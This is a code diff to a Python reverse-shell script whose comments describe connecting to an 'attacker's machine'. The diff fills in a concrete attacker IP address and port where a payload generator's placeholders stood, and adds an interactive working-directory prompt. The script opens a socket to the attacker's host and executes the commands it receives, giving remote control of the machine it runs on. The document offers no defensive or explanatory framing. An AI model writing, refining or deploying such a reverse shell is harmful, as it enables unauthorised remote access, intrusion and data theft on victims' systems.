@@ -3,8 +3,8 @@ import subprocess
 import os
 
 # Set up the target server and port (attacker's machine)
-HOST = '(here the payload generator will enter it)'  # Attacker's IP address
-PORT = (here the payload generator will enter it)  # Port the attacker is listening on
+HOST = '10.0.1.33'  # Attacker's IP address
+PORT = 9999  # Port the attacker is listening on
 
 # Function to execute commands on the target machine
 def execute_command(command):
@@ -18,10 +18,19 @@ sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 try:
     sock.connect((HOST, PORT))
     
+    # Send the initial cwd to show where the shell is starting
+    cwd = os.getcwd()
+    sock.sendall(f"Connected to {cwd} shell\n".encode('utf-8'))
+    
     while True:
-        # Receive the command from the attacker
-        command = sock.recv(1024).decode('utf-8')
+        # Display the current working directory in the prompt
+        cwd = os.getcwd()  # Get the current working directory
+        prompt = f"{cwd} > "
         
+        # Receive the command from the attacker
+        sock.sendall(prompt.encode('utf-8'))  # Send prompt with cwd
+        command = sock.recv(1024).decode('utf-8')
+
         if command.lower() == 'exit':
             sock.close()
             break
